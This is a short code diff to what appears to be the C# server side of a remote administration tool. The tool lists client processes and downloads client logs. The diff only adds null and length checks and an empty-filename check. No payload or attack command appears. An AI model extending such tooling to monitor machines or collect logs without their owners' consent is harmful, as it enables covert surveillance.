@@ -94,6 +94,13 @@ namespace xServer.Core.Commands
 
             client.Value.FrmTm.ClearListview();
 
+            // None of the arrays containing the process' information can be null.
+            // The must also be the exact same length because each entry in the three
+            // different arrays represents one process.
+            if (packet.Processes == null || packet.IDs == null || packet.Titles == null ||
+                packet.Processes.Length != packet.IDs.Length || packet.Processes.Length != packet.Titles.Length)
+                return;
+
             new Thread(() =>
             {
                 for (int i = 0; i < packet.Processes.Length; i++)
@@ -125,6 +132,9 @@ namespace xServer.Core.Commands
             }
 
             string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");
+
+            if (string.IsNullOrEmpty(packet.Filename))
+                return;
 
             if (!Directory.Exists(downloadPath))
                 Directory.CreateDirectory(downloadPath);
